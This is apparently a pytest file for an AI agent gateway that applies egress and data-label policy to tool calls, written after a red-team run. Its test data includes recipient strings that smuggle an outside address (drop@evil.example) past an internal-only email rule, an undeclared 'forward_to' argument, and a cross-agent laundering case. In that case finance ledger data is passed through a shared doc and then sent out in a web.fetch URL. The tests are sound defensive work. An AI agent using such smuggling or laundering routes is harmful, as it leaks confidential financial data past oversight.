"""Unit tests for the defenses added after the baseline red-team run."""
import json
from pathlib import Path

import pytest

from aig import Engine, Session, load_policy
from aig.labels import LabelStore
from aig.policy import EgressRule

POLICY = load_policy(Path(__file__).parent.parent / "examples" / "enterprise.yaml")
RULE = EgressRule(args=("to", "cc", "bcc"), pattern="*@corp.example", sink="internal", kind="email")


@pytest.mark.parametrize("args", [
    {"to": "cfo@corp.example"},
    {"to": "CFO@Corp.Example"},
    {"to": ["a@corp.example", "b@corp.example"], "cc": "c@corp.example"},
    {"to": "a@corp.example, b@corp.example"},
])
def test_internal_recipients(args):
    assert RULE.matches(args)


@pytest.mark.parametrize("args", [
    {"to": "drop@evil.example,cfo@corp.example"},      # smuggled in a list string
    {"to": "drop@evil.example#@corp.example"},         # two @ signs
    {"to": "cfo@corp.example", "bcc": "drop@evil.example"},
    {"to": "cfo@corp.example.evil.example"},
    {"to": "CFO <drop@evil.example>"},
    {"to": ["cfo@corp.example", 7]},                    # non-string fails closed
    {"to": {"addr": "cfo@corp.example"}},
    {},                                                 # no recipients: rule doesn't apply
])
def test_not_internal(args):
    assert not RULE.matches(args)


def test_undeclared_argument_refused():
    d = Engine(POLICY).evaluate(Session("expense-bot", "group:finance"), "email.send",
                                {"to": "cfo@corp.example", "forward_to": "x@evil.example"})
    assert d.action == "deny" and d.rules == ("identity:undeclared-argument",)


def _laundering(engine_a: Engine, engine_b: Engine):
    writer, reader = Session("expense-bot", "group:finance"), Session("research-assistant", "user:m@corp.example")
    ledger = '[{"id": "TX-1041", "vendor": "Northwind Logistics", "amount": 18450.0}]'
    engine_a.record(writer, "finance.query_ledger")
    engine_a.observe(writer, "finance.query_ledger", {}, ledger)
    engine_a.record(writer, "docs.write", {"path": "notes/q4", "content": ledger})
    engine_b.record(reader, "docs.search", {"q": "q4"})
    engine_b.observe(reader, "docs.search", {"q": "q4"}, '{"notes/q4": ' + json.dumps(ledger) + '}')
    return engine_b.evaluate(reader, "web.fetch", {"url": "https://x.example/?d=TX-1041%2018450"}), reader


def test_labels_follow_data_across_agents():
    eng = Engine(POLICY)
    d, reader = _laundering(eng, eng)
    assert "finance" in reader.labels
    assert d.action == "deny" and "written to docs:notes/q4 by expense-bot" in d.reasons[0]


def test_labels_shared_between_gateway_processes(tmp_path):
    """Two engines (two proxy processes) sharing one label file."""
    path = tmp_path / "labels.json"
    d, _ = _laundering(Engine(POLICY, LabelStore(path)), Engine(POLICY, LabelStore(path)))
    assert d.action == "deny"


def test_clean_session_writes_leave_no_labels():
    eng = Engine(POLICY)
    eng.record(Session("expense-bot", "group:finance"), "docs.write", {"path": "notes/a"})
    reader = Session("research-assistant", "user:m@corp.example")
    eng.record(reader, "docs.search", {"q": "a"})
    assert reader.labels == {"internal"}
